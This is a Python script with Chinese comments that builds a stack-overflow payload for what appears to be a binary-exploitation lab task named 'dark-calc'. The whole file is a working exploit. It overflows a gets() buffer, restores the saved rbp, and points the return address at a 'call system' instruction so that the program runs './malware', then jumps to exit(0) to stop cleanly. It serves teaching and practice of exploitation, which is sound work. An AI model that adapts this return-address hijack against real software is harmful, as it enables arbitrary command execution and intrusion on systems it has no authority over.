#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

思路：input() 里 gets 没有长度检查，可以一路覆盖到 input 的返回地址。
strcpy 会先把缓冲区开头的 "./malware" 复制进全局变量 command_buf(0x6030d0)，
我们再把返回地址改成 eval() 中 "mov edi, command_buf; call system" 这两条指令的
地址，于是 system 直接执行 command_buf 里的命令，跳过 eval 自己拼接
"echo $((" ... "))" 的过程。

saved rbp 要填回 main 的 rbp（0x721000800ff0），因为 eval 的收尾指令 leave
会拿它来恢复 rsp；填错的话 system 返回之后就会崩在 leave 上。

init_fixed_stack 把栈顶固定在 0x721000801000（紧挨着一页 PROT_NONE 的 guard page），
缓冲区 0x721000800fd0 之后只剩 47 字节可用，所以 payload 只写 47 字节，
剩下的 0x00 由 gets 自己补——正好落在最后一个可用字节 0x721000800fff。
"""
import sys

# input() 栈布局（-O0，非 PIE）：
#   [rbp-0x10, rbp)      expression[16]   <- offset 0
#   [rbp,      rbp+8)    saved rbp        <- offset 16
#   [rbp+8,    rbp+0x10) 返回地址          <- offset 24
OFFSET_RET = 24

MAIN_RBP = 0x721000800FF0   # main 的 rbp，由 __wrap_main 固定下来的栈顶算出
SYSTEM_CALL = 0x401A6B      # eval+0x94: mov edi,0x6030d0; call system
EXIT_ZERO = 0x4019B9        # input 里 "mov edi,0; call exit" 的位置


def p64(x):
    return x.to_bytes(8, "little")


payload = b"./malware\x00"                       # 会被 strcpy 复制到 command_buf
payload += b"A" * (16 - len(payload))            # 填满 expression[16]
payload += p64(MAIN_RBP)                         # saved rbp：要还原成 main 的 rbp
payload += p64(SYSTEM_CALL)                      # 劫持返回地址，跳进 eval
payload += p64(0)                                # eval 的 leave 会把它弹进 rbp
payload += p64(EXIT_ZERO)                        # eval 的 ret 落到这里，exit(0)

payload = payload[:47]   # 第 48 个字节留给 gets 写入的 '\0'，避免踩到 guard page

sys.stdout.buffer.write(payload)
